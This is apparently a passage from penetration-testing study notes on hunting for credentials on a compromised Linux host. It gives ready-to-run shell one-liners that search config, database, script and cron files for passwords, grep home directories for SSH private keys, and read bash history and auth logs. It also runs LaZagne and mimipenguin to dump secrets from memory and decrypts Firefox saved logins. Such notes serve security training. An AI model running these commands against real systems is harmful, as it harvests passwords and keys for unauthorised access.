-- -
### Config Files
See if there are any config files on the system and see if they hold any credentials.
```bash
# search for config files and output path to found config files
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done

# Search for config files then search its contents for term "user", "password", and "pass"
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
```
### DB files
Search for database files that may hold credential info on it.
```bash
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
```
### Notes
Harder to define since notes files can be named anything with any number of extensions or no file extension at all. In this example, we will search for txt files and files with no extension.
```bash
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```
### Scripts
As an automation engineer you should know that automated scripts usually require a set of credentials to run automatically and that engineers love to just put that into files
```bash
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
```
### Cronjobs
Same areas to look as priv esc using cronjobs, but here the goal is to see if the automated jobs have credentials associated with it.
```bash
# will show any custom files and what not
cat /etc/crontab

# Scripts and files used by cron will be located at the following llocation for debian-based systems
ls -la /etc/cron.*/

# then look through any interesting files to see if anyone left credentials in the files. 
```
### SSH Keys
```bash
# private keys
grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"

# public keys
grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"
```
### Bash History
```bash
tail -n5 /home/*/.bash*
```
### Logs
The following are log file locations and a short description of why they exist:

|**Log File**|**Description**|
|---|---|
|`/var/log/messages`|Generic system activity logs.|
|`/var/log/syslog`|Generic system activity logs.|
|`/var/log/auth.log`|(Debian) All authentication related logs.|
|`/var/log/secure`|(RedHat/CentOS) All authentication related logs.|
|`/var/log/boot.log`|Booting information.|
|`/var/log/dmesg`|Hardware and drivers related information and logs.|
|`/var/log/kern.log`|Kernel related warnings, errors and logs.|
|`/var/log/faillog`|Failed login attempts.|
|`/var/log/cron`|Information related to cron jobs.|
|`/var/log/mail.log`|All mail server related logs.|
|`/var/log/httpd`|All Apache related logs.|
|`/var/log/mysqld.log`|All MySQL server related logs.|
Searching log file contents:
```bash
for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
```
### Memory
Using this tool require root privileges so it's purely a process to try after you have rooted the server. 
```bash
#LaZagne
sudo python2.7 laZasgne.py all

# mimipenguin
sudo python3 mimipenguin.py
sudo bash mimipenguin.sh
```
### Browsers
```bash
# LaZagne
python3 laZagne.py browsers

# manual
ls -l .mozilla/firefox/ | grep default

# then lets say one of the directorys spit out was: 1bplpd86.default-release
# cat out the logins.json file from that directory
cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .

# decrypt password
# you will give it the file locations you want to try. Will auto-find the directories.
python3.9 firefox_decrypt.py
```
### Old User Passwords
The PAM library (how most auth on linux works) can prevent users from reusing old passwords, which means it saves old passwords somewhere. This file can only be read with root privs so keep that in mind.
```bash
sudo cat /etc/security/opasswd
```